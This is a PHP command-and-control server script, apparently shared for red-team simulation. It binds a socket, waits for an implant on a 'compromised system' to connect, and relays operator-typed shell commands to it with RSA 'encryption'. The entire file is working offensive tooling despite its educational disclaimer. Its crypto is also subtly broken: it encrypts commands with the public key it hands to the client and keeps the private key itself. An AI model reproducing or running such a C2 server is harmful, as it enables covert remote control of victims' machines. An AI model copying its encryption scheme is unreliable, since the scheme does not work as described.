<?php
// This PHP C2 server script enables remote communication by utilizing RSA encryption for secure data transmission between the attacker server and the target. Commands are encrypted using RSA encryption before being sent to the target.

// This C2 is for simulation only and is still under development
// php C2-Server.php
// Author: S3N4T0R
// Date: 2024-6-16

// Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.

// Generate RSA keys
function generate_rsa_keys() {
    $config = array(
        "digest_alg" => "sha256",
        "private_key_bits" => 2048,
        "private_key_type" => OPENSSL_KEYTYPE_RSA,
    );
    $res = openssl_pkey_new($config);
    openssl_pkey_export($res, $private_key);
    $public_key = openssl_pkey_get_details($res)["key"];

    return array($private_key, $public_key);
}

// Encrypt data using RSA
function rsa_encrypt($data, $public_key) {
    openssl_public_encrypt($data, $encrypted_data, $public_key);
    return $encrypted_data;
}

// Decrypt data using RSA
function rsa_decrypt($data, $private_key) {
    openssl_private_decrypt($data, $decrypted_data, $private_key);
    return $decrypted_data;
}

// Send encrypted output to the payload
function send_to_payload($socket, $data, $public_key) {
    $encrypted_data = rsa_encrypt($data, $public_key);
    socket_write($socket, $encrypted_data, strlen($encrypted_data));
}

// Encrypted commands from the payload
function receive_from_payload($socket, $buffer_size, $private_key) {
    $encrypted_data = socket_read($socket, $buffer_size);
    return rsa_decrypt($encrypted_data, $private_key);
}

echo "\033[0;32m";
echo <<<BANNER

 ############################################################################################
# 1. Enter a command directly to be executed by the compromised system.                     #
# 2. Commands are securely transmitted using RSA encryption.                                #
# NOTE: Enter the command to execute when prompted.                                         #
 ###########################################################################################

BANNER;
echo "\033[0m\n"; 

$attacker_ip = readline("[*] Enter your IP: ");
$c2_port = readline("[*] Enter C2 server port: ");

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Socket creation failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

if (!socket_bind($socket, $attacker_ip, $c2_port)) {
    echo "Socket bind failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

if (!socket_listen($socket, 5)) {
    echo "Socket listen failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "[*] Waiting for incoming connection...\n";

// Accept incoming connection
$client_socket = socket_accept($socket);
if ($client_socket === false) {
    echo "Socket accept failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

list($private_key, $public_key) = generate_rsa_keys();

// Send the public key to the client
socket_write($client_socket, $public_key, strlen($public_key));

// Main loop for fetching and executing commands
while (true) {
    // Get command directly from user
    $command = readline("[*] Enter command to execute: ");
    send_to_payload($client_socket, $command, $public_key);

    // Exit the loop if the command is 'exit'
    if (trim($command) == 'exit') {
        echo "Exiting...\n";
        break;
    }

    // Receive output from payload
    $output = receive_from_payload($client_socket, 4096, $private_key);

    echo "[*] Command Output:\n$output\n";

    // Wait for a period before fetching new commands
    sleep(10);
}

// Close sockets
socket_close($client_socket);
socket_close($socket);

?>

